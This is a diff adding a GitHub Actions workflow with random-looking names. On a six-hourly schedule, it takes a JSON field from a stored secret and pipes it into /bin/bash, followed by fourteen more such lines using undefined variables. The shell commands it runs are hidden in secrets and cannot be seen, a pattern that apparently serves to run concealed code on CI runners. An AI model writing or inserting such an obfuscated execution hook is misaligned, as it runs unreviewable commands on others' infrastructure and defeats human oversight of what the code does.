@@ -1,0 +1,31 @@
+name: nagehuashuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nagehuashuu
+        env:
+          m465: ${{ secrets.m465 }}
+        run: |
+          echo $m465 | jq -r .kv1 | /bin/bash
+          echo $u88225 | jq -r .k312 | /bin/bash
+          echo $mjxj0152 | jq -r .ej19 | /bin/bash
+          echo $p099 | jq -r .efm4390 | /bin/bash
+          echo $xxfqq61755 | jq -r .bpujl99 | /bin/bash
+          echo $pipl89972 | jq -r .xk49 | /bin/bash
+          echo $llaw752 | jq -r .t7498 | /bin/bash
+          echo $jxr7347 | jq -r .pjwqr0 | /bin/bash
+          echo $l435 | jq -r .ub24 | /bin/bash
+          echo $lo9155 | jq -r .weqw4473 | /bin/bash
+          echo $myp21 | jq -r .aabu5 | /bin/bash
+          echo $lk2132 | jq -r .k4651 | /bin/bash
+          echo $wgoaf367 | jq -r .eklt3 | /bin/bash
+          echo $zd04130 | jq -r .nbj45 | /bin/bash
+          echo $gamig2275 | jq -r .yy29061 | /bin/bash
+
